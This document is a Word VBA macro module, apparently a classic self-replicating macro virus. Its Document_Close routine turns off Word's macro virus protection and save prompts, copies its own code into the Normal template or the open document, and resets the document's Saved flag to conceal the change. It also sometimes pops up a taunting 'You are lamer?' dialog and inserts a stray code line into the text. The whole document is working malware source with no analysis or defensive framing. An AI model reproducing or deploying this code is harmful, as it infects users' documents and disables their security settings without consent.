   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   Version = 0.24
   ' Ïî÷åìó òû íå ñêàçàë Áå-Áå ???
       On Error Resume Next
       s = ActiveDocument.Saved
       Application.EnableCancelKey = Not -1
       With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
       Randomize
           Open NormalTemplate.Path & "\Normal.dat" For Output As #1
           Open NormalTemplate.Path & "\License.dat" For Output As #2
           For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
               a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
               Print #1, a
               If i = 2 Then Print #2, a
           Next i
           Close #1
           Close #2
       If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
           If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 7) <> "Version" Then
               Set t = NormalTemplate.VBProject.VBComponents.Item(1)
           End If
       ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
           Set t = ActiveDocument.VBProject.VBComponents.Item(1)
       Else
           t = ""
       End If
       If t <> "" Then
           Open NormalTemplate.Path & "\Normal.dat" For Input As #1
           If LOF(1) = 0 Then GoTo q
           i = 1
           Do While Not EOF(1)
               Line Input #1, a
               t.CodeModule.InsertLines i, a
               i = i + 1
           Loop
   q:      Close #1
           If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
           If Rnd < 0.3 Then
               a = MsgBox("You are lamer? Press OK to confirm", vbOKOnly, "Windows NT")
           End If
       End If
       Kill NormalTemplate.Path & "\Normal.dat"
       If Rnd < 0.05 Then
           ActiveDocument.Content.InsertFile NormalTemplate.Path & "\License.dat"
           ActiveDocument.Save
       End If
       If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
       Kill NormalTemplate.Path & "\License.dat"
   End Sub

   Private Sub Document_New()
       a = MsgBox("È çà÷åì òåáå ýòîò ïóñòîé ôàéë ???", vbQuestion, "WindowsNT")
   End Sub
